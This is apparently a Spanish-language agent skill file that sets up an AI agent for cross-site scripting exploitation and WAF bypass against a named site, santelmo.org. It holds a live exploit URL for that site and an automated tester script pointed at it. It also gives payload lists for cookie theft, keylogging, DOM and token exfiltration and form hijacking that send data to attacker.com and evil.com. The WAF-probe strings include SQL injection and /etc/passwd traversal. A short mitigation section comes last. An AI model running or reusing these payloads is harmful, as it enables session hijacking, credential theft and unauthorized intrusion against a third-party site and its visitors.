---
name: xss-agent
description: Agente especializado en Cross-Site Scripting (XSS). Usar para: (1) XSS Reflected/Stored/DOM, (2) WAF Bypass techniques, (3) Encoding evasion (Base64, UTF-7, HTML entities), (4) Context-specific payloads (HTML, href, JavaScript), (5) Filter evasion avanzada. Trigger: cuando se necesite testing XSS o bypass de WAF.
---

# 🎯 XSS Agent - Especialista en Cross-Site Scripting

## Objetivo
Detectar y explotar vulnerabilidades XSS con técnicas avanzadas de evasión de WAF y filtros.

---

## HALLAZGOS DOCUMENTADOS (2026)

### FINDING-009: XSS via Base64 Encoding - CRITICAL (CVSS 9.1)

```yaml
Técnica: Base64 encoding en URL path
Target: www.santelmo.org
Endpoint: /en/news/tag-list/tag/{BASE64_PAYLOAD}/valderrama/
Estado: EXPLOTABLE - WAF BYPASS COMPLETO
Severidad: CRITICAL (CVSS 9.1)

Ejemplo exitoso:
  Payload raw: <script>alert("l0ve was here")</script>
  Payload B64: PHNjcmlwdD5hbGVydCgibDB2ZSB3YXMgaGVyZSIpPC9zY3JpcHQ+
  URL: https://www.santelmo.org/en/news/tag-list/tag/PHNjcmlwdD5hbGVydCgibDB2ZSB3YXMgaGVyZSIpPC9zY3JpcHQ+/valderrama/

Por qué funciona:
  1. WAF no inspecciona Base64 en paths
  2. Backend decodifica Base64 automáticamente
  3. Output NO tiene HTML encoding
  4. Script ejecuta en contexto de víctima
```

---

## 1. WAF BYPASS TECHNIQUES (2025-2026)

### 1.1 Base64 Encoding (CRITICAL - Confirmado)

```python
import base64

def generate_b64_xss(payload, base_url):
    """
    Genera payload XSS codificado en Base64 para bypass de WAF.
    Técnica confirmada en santelmo.org (FINDING-009)
    """
    b64 = base64.b64encode(payload.encode()).decode()

    # Patrones de URL donde puede funcionar
    url_patterns = [
        f"{base_url}/tag/{b64}/",
        f"{base_url}/search/{b64}/",
        f"{base_url}/category/{b64}/",
        f"{base_url}/filter/{b64}/",
        f"{base_url}/q/{b64}/",
    ]

    return {
        "raw": payload,
        "base64": b64,
        "urls": url_patterns
    }

# Payloads Base64 para testing
B64_PAYLOADS = {
    # Básicos
    "alert_basic": '<script>alert(1)</script>',
    "alert_doc": '<script>alert(document.domain)</script>',
    "alert_custom": '<script>alert("XSS")</script>',

    # Cookie stealing
    "cookie_img": '<img src=x onerror="new Image().src=\'https://attacker.com/c?\'+document.cookie">',
    "cookie_fetch": '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>',

    # DOM exfiltration
    "dom_exfil": '<script>fetch("https://attacker.com/html?d="+btoa(document.body.innerHTML))</script>',

    # Keylogger
    "keylogger": '<script>document.onkeypress=e=>fetch("https://attacker.com/k?"+e.key)</script>',

    # Form hijacking
    "form_hijack": '<script>document.forms[0].action="https://attacker.com/capture"</script>',

    # Session token
    "session_exfil": '<script>fetch("https://attacker.com/?t="+localStorage.getItem("token"))</script>',

    # SVG variants
    "svg_onload": '<svg onload=alert(1)>',
    "svg_script": '<svg><script>alert(1)</script></svg>',

    # IMG variants
    "img_onerror": '<img src=x onerror=alert(1)>',
    "img_onload": '<img src=valid.jpg onload=alert(1)>',

    # Body events
    "body_onload": '<body onload=alert(1)>',
    "body_onerror": '<body onerror=alert(1)>',
}

def generate_all_b64_payloads(base_url):
    """Genera todos los payloads Base64"""
    results = []
    for name, payload in B64_PAYLOADS.items():
        b64 = base64.b64encode(payload.encode()).decode()
        results.append({
            "name": name,
            "raw": payload,
            "base64": b64,
            "url": f"{base_url}/{b64}/"
        })
    return results
```

### 1.2 UTF-7 Encoding (CVE-2026-21876 - Teórico)

```python
"""
UTF-7 Encoding Bypass
Estado: Pasa WAF pero NO explotable en browsers modernos
Razón: charset=UTF-8 en response headers previene interpretación UTF-7

Útil para: Aplicaciones legacy o sin charset declarado
"""

UTF7_PAYLOADS = {
    # <script>alert(1)</script> en UTF-7
    "script_alert": "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",

    # <img src=x onerror=alert(1)>
    "img_onerror": "+ADw-img src+AD0-x onerror+AD0-alert(1)+AD4-",

    # <svg onload=alert(1)>
    "svg_onload": "+ADw-svg onload+AD0-alert(1)+AD4-",

    # javascript:alert(1)
    "javascript_proto": "+ACI-+AD4-+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
}

# Cuando funciona UTF-7:
UTF7_CONDITIONS = """
1. Response NO tiene charset declarado
2. O tiene: Content-Type: text/html (sin charset)
3. Browser interpreta como UTF-7 (muy raro hoy)
4. Aplicación legacy o mal configurada
"""
```

### 1.3 HTML Entities Encoding (Teórico)

```python
"""
HTML Entities Bypass
Estado: Pasa WAF pero NO explotable por doble decodificación
Razón: Browsers modernos NO decodifican entities después de URL decode

Especificación HTML5:
"User agents must not decode character references in attributes
that are already URL-encoded."
"""

HTML_ENTITY_PAYLOADS = {
    # javascript:alert(1) con 'j' como entity
    "j_entity": "&#106;avascript:alert(1)",       # j = &#106;
    "j_hex_entity": "&#x6A;avascript:alert(1)",   # j = &#x6A;

    # Con múltiples entities
    "ja_entities": "&#106;&#97;vascript:alert(1)", # ja = &#106;&#97;

    # Script completo
    "script_entities": "&#60;script&#62;alert(1)&#60;/script&#62;",
}

# URL encoding necesario para que llegue al HTML
def encode_for_url(entity_payload):
    """
    Para que &#106; aparezca en HTML, necesitas URL-encodear el &
    &#106; → %26%23106%3B
    """
    return entity_payload.replace("&", "%26").replace("#", "%23").replace(";", "%3B")

# Ejemplo:
# Original: &#106;avascript:alert(1)
# URL-encoded: %26%23106%3Bavascript%3Aalert%281%29
# En HTML: &#106;avascript:alert(1)
# Pero browser NO decodifica a javascript:alert(1)
```

### 1.4 Double URL Encoding

```python
"""
Double URL Encoding
Estado: Depende del backend
Funciona cuando: Backend hace doble decode de parámetros
"""

DOUBLE_ENCODED = {
    # <script>alert(1)</script>
    "script": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",

    # <img src=x onerror=alert(1)>
    "img": "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E",

    # javascript:alert(1)
    "javascript": "%256Aavascript%253Aalert(1)",
}

def double_encode(payload):
    """Aplica doble URL encoding"""
    import urllib.parse
    first = urllib.parse.quote(payload, safe='')
    second = urllib.parse.quote(first, safe='')
    return second
```

### 1.5 Unicode/Homoglyph Bypass

```python
"""
Unicode Normalization Bypass
Estado: Depende del backend
Funciona cuando: Backend normaliza Unicode antes de renderizar
"""

UNICODE_PAYLOADS = {
    # Usando caracteres Unicode similares
    "fullwidth": "＜script＞alert(1)＜／script＞",  # Fullwidth chars

    # Script con homoglyphs
    "cyrillic_a": "<script>аlert(1)</script>",  # а cirílica vs a latina

    # Usando caracteres de control
    "null_byte": "<scr\x00ipt>alert(1)</script>",
    "tab": "<scr\tipt>alert(1)</script>",
    "newline": "<scr\nipt>alert(1)</script>",
}
```

### 1.6 Case Variation & Obfuscation

```python
"""
Case Variation y Obfuscation
Técnicas clásicas que aún funcionan contra WAFs básicos
"""

CASE_PAYLOADS = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<scRIPT>alert(1)</scRIPT>",
    "<sCrIpT>alert(1)</sCrIpT>",
]

OBFUSCATION_PAYLOADS = [
    # Con espacios/tabs
    "<script >alert(1)</script >",
    "<script\t>alert(1)</script>",
    "<script\n>alert(1)</script>",
    "<script/>alert(1)</script>",

    # Con comentarios HTML
    "<script>alert(1)<!--",
    "<!--><script>alert(1)</script>",

    # Con atributos extra
    "<script abc>alert(1)</script>",
    "<script zzz=\"\">alert(1)</script>",

    # Sin cerrar
    "<script>alert(1)//",
    "<script>alert(1)\n",
]
```

---

## 2. CONTEXT-SPECIFIC PAYLOADS

### 2.1 HTML Context

```python
HTML_CONTEXT_PAYLOADS = [
    # Tags básicos
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',

    # Event handlers
    '<div onmouseover=alert(1)>hover me</div>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',

    # Tags menos comunes (WAF evasion)
    '<details open ontoggle=alert(1)>',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    '<xss contenteditable onblur=alert(1)>click</xss>',
    '<svg><animate onbegin=alert(1) attributeName=x>',
]
```

### 2.2 Attribute Context (href, src, action)

```python
"""
Contexto de atributos href/src/action
Requiere javascript: protocol o data: URI
"""

HREF_CONTEXT_PAYLOADS = [
    # javascript: protocol
    'javascript:alert(1)',
    'javascript:alert(document.domain)',
    'javascript:alert(document.cookie)',

    # Con codificación
    'javascript&#58;alert(1)',
    'javascript&#x3A;alert(1)',
    'java\nscript:alert(1)',
    'java\tscript:alert(1)',

    # data: URI
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',

    # vbscript (IE legacy)
    'vbscript:msgbox(1)',
]

# Para atributos event-based dentro de tags
EVENT_ATTRIBUTE_PAYLOADS = [
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)'",
    '" onfocus="alert(1)" autofocus="',
    "' onclick='alert(1)'//",
]
```

### 2.3 JavaScript Context

```python
"""
Inyección dentro de bloques <script> existentes
"""

JS_CONTEXT_PAYLOADS = [
    # Cerrar string y ejecutar
    "'; alert(1);//",
    '"; alert(1);//',
    "\\'; alert(1);//",

    # Template literals
    "${alert(1)}",
    "`${alert(1)}`",

    # Escapar de función
    ")); alert(1);//",
    "}; alert(1);//",

    # DOM-based
    "'-alert(1)-'",
    "'+alert(1)+'",
]

# Para JSON context
JSON_CONTEXT_PAYLOADS = [
    '{"key":"value","x":"</script><script>alert(1)</script>"}',
    '{"key":"</script><script>alert(1)//"}',
]
```

### 2.4 CSS Context

```python
"""
XSS via CSS (muy limitado en browsers modernos)
"""

CSS_CONTEXT_PAYLOADS = [
    # Expression (IE only)
    "expression(alert(1))",

    # url() con javascript (legacy)
    "url(javascript:alert(1))",

    # Behavior (IE)
    "behavior:url(xss.htc)",

    # Escapar de CSS
    "}</style><script>alert(1)</script>",
    "};alert(1)//",
]
```

---

## 3. WAF DETECTION & ANALYSIS

### 3.1 Identificar WAF

```python
def detect_waf(url, test_param="test"):
    """
    Detecta presencia de WAF y su tipo
    """
    import requests

    # Payloads de detección
    waf_triggers = [
        "<script>alert(1)</script>",
        "' OR '1'='1",
        "../../../etc/passwd",
        "{{7*7}}",
    ]

    waf_signatures = {
        "cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
        "akamai": ["akamai", "ak_bmsc"],
        "aws_waf": ["x-amzn-requestid", "aws"],
        "modsecurity": ["mod_security", "NOYB"],
        "f5_big_ip": ["bigipserver", "f5"],
        "imperva": ["incapsula", "_incap_"],
        "fortinet": ["fortigate", "fortiwebserver"],
        "barracuda": ["barra", "bnnw"],
    }

    results = {
        "waf_detected": False,
        "waf_type": "Unknown",
        "blocking_payloads": [],
        "allowed_payloads": []
    }

    for payload in waf_triggers:
        try:
            r = requests.get(url, params={test_param: payload}, timeout=10)

            # Check status code
            if r.status_code == 403:
                results["waf_detected"] = True
                results["blocking_payloads"].append(payload)
            else:
                results["allowed_payloads"].append(payload)

            # Check headers for WAF signatures
            for waf_name, signatures in waf_signatures.items():
                for sig in signatures:
                    if sig.lower() in str(r.headers).lower() or sig.lower() in r.text.lower():
                        results["waf_type"] = waf_name

        except Exception as e:
            pass

    return results
```

### 3.2 WAF Bypass Testing Methodology

```yaml
Metodología de Bypass (Aplicada en santelmo.org):

1. IDENTIFICACIÓN:
   - Enviar payload básico: <script>alert(1)</script>
   - Si HTTP 403 → WAF detectado
   - Analizar headers de respuesta

2. ENCODING TESTS (85+ payloads):
   ├── URL encoding simple
   ├── Double URL encoding
   ├── Unicode encoding
   ├── HTML entities
   ├── UTF-7 encoding
   ├── Base64 encoding ← EXITOSO
   └── Mixed encoding

3. EVASION TESTS:
   ├── Case variation
   ├── Null bytes
   ├── Comments
   ├── Whitespace
   └── Alternative tags

4. CONTEXT ANALYSIS:
   ├── Parámetros GET/POST
   ├── Headers (User-Agent, Referer)
   ├── Cookies
   ├── URL path segments ← EXITOSO (Base64)
   └── JSON body

5. VERIFICACIÓN:
   ├── Payload refleja en HTML?
   ├── Sin encoding de salida?
   ├── Ejecuta JavaScript?
   └── CVSS scoring
```

---

## 4. EXPLOITATION WORKFLOW

### 4.1 Metodología Completa

```
1. RECONNAISSANCE
   ├── Identificar parámetros reflectivos
   ├── Detectar contexto de reflexión
   ├── Identificar filtros/WAF
   └── Mapear caracteres permitidos

2. PAYLOAD CRAFTING
   ├── Seleccionar payload por contexto
   ├── Aplicar técnicas de evasión
   ├── Probar variantes
   └── Verificar ejecución

3. EXPLOITATION
   ├── Confirmar ejecución de JS
   ├── Desarrollar payload final
   ├── Documentar PoC
   └── Calcular impacto (CVSS)

4. DOCUMENTATION
   ├── Request/Response completos
   ├── Screenshots/videos
   ├── Pasos de reproducción
   └── Recomendaciones de mitigación
```

### 4.2 Script de Testing Automatizado

```python
#!/usr/bin/env python3
"""
XSS Payload Tester con WAF Bypass
Basado en FINDING-009 de santelmo.org
"""

import base64
import requests
import urllib.parse
from typing import List, Dict

class XSSPayloadTester:
    def __init__(self, base_url: str, param: str = "test"):
        self.base_url = base_url
        self.param = param
        self.results = []

    def test_reflection(self, payload: str) -> Dict:
        """Test si el payload se refleja"""
        try:
            r = requests.get(
                self.base_url,
                params={self.param: payload},
                timeout=10
            )

            return {
                "payload": payload,
                "status_code": r.status_code,
                "reflected": payload in r.text,
                "html_encoded": urllib.parse.quote(payload) in r.text,
                "waf_blocked": r.status_code == 403
            }
        except Exception as e:
            return {"payload": payload, "error": str(e)}

    def test_base64_path(self, payload: str, path_template: str) -> Dict:
        """
        Test Base64 encoding en URL path
        path_template: "/tag/{}/valderrama/"
        """
        b64 = base64.b64encode(payload.encode()).decode()
        url = self.base_url + path_template.format(b64)

        try:
            r = requests.get(url, timeout=10)

            # Verificar si payload aparece decodificado
            reflected_raw = payload in r.text

            return {
                "payload_raw": payload,
                "payload_b64": b64,
                "url": url,
                "status_code": r.status_code,
                "reflected_raw": reflected_raw,
                "waf_blocked": r.status_code == 403,
                "exploitable": reflected_raw and r.status_code == 200
            }
        except Exception as e:
            return {"error": str(e)}

    def run_full_test(self, payloads: List[str]):
        """Ejecutar test completo"""
        results = {
            "waf_bypass": [],
            "reflected": [],
            "blocked": [],
            "exploitable": []
        }

        for payload in payloads:
            # Test directo
            direct = self.test_reflection(payload)

            # Test Base64 path
            b64_result = self.test_base64_path(
                payload,
                "/en/news/tag-list/tag/{}/poc/"
            )

            if direct.get("waf_blocked"):
                results["blocked"].append(payload)
            elif direct.get("reflected"):
                results["reflected"].append(payload)

            if b64_result.get("exploitable"):
                results["waf_bypass"].append(payload)
                results["exploitable"].append({
                    "payload": payload,
                    "url": b64_result["url"]
                })

        return results

# Uso
if __name__ == "__main__":
    tester = XSSPayloadTester("https://www.santelmo.org")

    payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
    ]

    results = tester.run_full_test(payloads)
    print(f"WAF Bypassed: {len(results['waf_bypass'])}")
    print(f"Exploitable: {len(results['exploitable'])}")
```

---

## 5. PAYLOADS COLLECTION

### 5.1 Payloads Confirmados (santelmo.org)

```python
# Payloads que bypasean WAF via Base64 encoding
CONFIRMED_PAYLOADS = [
    # Básicos - CONFIRMADOS
    '<script>alert(1)</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert("l0ve was here")</script>',

    # Cookie stealing - CONFIRMADOS
    '<script>fetch("https://attacker.com/?c="+document.cookie)</script>',
    '<img src=x onerror="fetch(\'https://attacker.com/?c=\'+document.cookie)">',

    # Keylogger - CONFIRMADO
    '<script>document.onkeypress=e=>fetch("https://attacker.com/k?"+e.key)</script>',

    # DOM exfiltration - CONFIRMADO
    '<script>fetch("https://attacker.com/?h="+btoa(document.body.innerHTML))</script>',

    # SVG variants - CONFIRMADOS
    '<svg onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',

    # IMG variants - CONFIRMADOS
    '<img src=x onerror=alert(1)>',
    '<img/src=x onerror=alert(1)>',
]
```

### 5.2 Payloads por Severidad

```python
# CRITICAL - Full account takeover potential
CRITICAL_PAYLOADS = [
    # Session hijacking
    '<script>fetch("https://evil.com/s?c="+document.cookie)</script>',

    # Credential theft
    '<script>document.forms[0].action="https://evil.com/steal"</script>',

    # Keylogger persistent
    '<script>setInterval(()=>fetch("https://evil.com/k?d="+btoa(document.body.innerHTML)),5000)</script>',

    # Token exfiltration
    '<script>fetch("https://evil.com/t?t="+localStorage.getItem("jwt"))</script>',
]

# HIGH - Significant impact
HIGH_PAYLOADS = [
    # Defacement
    '<script>document.body.innerHTML="<h1>Hacked</h1>"</script>',

    # Redirect
    '<script>location="https://evil.com/phish"</script>',

    # Popup phishing
    '<script>open("https://evil.com/fake-login")</script>',
]

# MEDIUM - Limited impact
MEDIUM_PAYLOADS = [
    '<script>alert(document.domain)</script>',
    '<img src=x onerror=alert(1)>',
]
```

---

## 6. DEFENSE ANALYSIS

### 6.1 Protecciones Identificadas

```yaml
santelmo.org Defense Analysis:

WAF (ModSecurity):
  - Bloquea: <script>, javascript:, onerror=
  - NO bloquea: Base64 en paths
  - Efectividad: ~97% (bypass via Base64)

Charset Declaration:
  - Content-Type: text/html; charset=UTF-8
  - Previene: UTF-7 encoding attacks
  - Efectividad: 100% contra UTF-7

Browser Security:
  - NO hace double decoding
  - Previene: HTML entity attacks en URL
  - Efectividad: 100%

Missing Protections:
  - CSP: NO implementado
  - Output encoding: NO en tag-list
  - Input validation: Incompleta
```

### 6.2 Recomendaciones de Mitigación

```yaml
Remediación Prioritaria:

1. CRITICAL - Output Encoding:
   - htmlspecialchars() en PHP
   - HTML.escape() en Python
   - Aplicar en TODA reflexión de datos

2. HIGH - Content Security Policy:
   - Content-Security-Policy: default-src 'self'
   - Bloquear inline scripts
   - Reportar violaciones

3. HIGH - Input Validation:
   - Validar Base64 inputs
   - Whitelist de caracteres
   - Decodificar y validar contenido

4. MEDIUM - WAF Rules:
   - Añadir regla para Base64 en paths
   - Inspeccionar contenido decodificado
   - Actualizar ModSecurity CRS
```

---

## 7. OUTPUT FORMAT

```json
{
  "finding_id": "SANTELMO-XSS-009",
  "type": "Reflected XSS",
  "technique": "Base64 Encoding WAF Bypass",
  "endpoint": "/en/news/tag-list/tag/{B64}/valderrama/",
  "parameter_type": "URL Path Segment",
  "waf_bypassed": true,
  "cvss_score": 9.1,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
  "severity": "CRITICAL",
  "exploitability": "HIGH",
  "poc": {
    "payload_raw": "<script>alert(1)</script>",
    "payload_encoded": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "full_url": "https://www.santelmo.org/en/news/tag-list/tag/PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==/valderrama/"
  },
  "impact": [
    "Session hijacking",
    "Account takeover",
    "Credential theft",
    "Malware distribution"
  ],
  "evidence_path": "06-evidence/screenshots/XSS-009.png",
  "remediation": "Implement output encoding and CSP headers"
}
```

---

## 8. ARCHIVOS DE SALIDA

```
03-vulnerabilities/additional/xss/
├── FINDING-009-XSS-BASE64-TAG-LIST.md
├── WAF-ANALYSIS.md
├── UTF7-ENCODING-RESEARCH.md
├── HTML-ENTITIES-FINAL-ANALYSIS.md
└── RESUMEN-FINAL-COMPLETO.md

06-evidence/
├── payloads/
│   ├── base64-xss-payloads.txt
│   └── waf-bypass-payloads.txt
├── screenshots/
│   └── XSS-009-execution.png
└── requests/
    └── XSS-009-request.txt

tools/
└── base64-xss-generator.py
```

---

**Versión**: 1.0
**Última actualización**: 2026-01-29
**Basado en**: FINDING-009 santelmo.org
**Modelo recomendado**: sonnet (standard) / opus (complex bypass research)
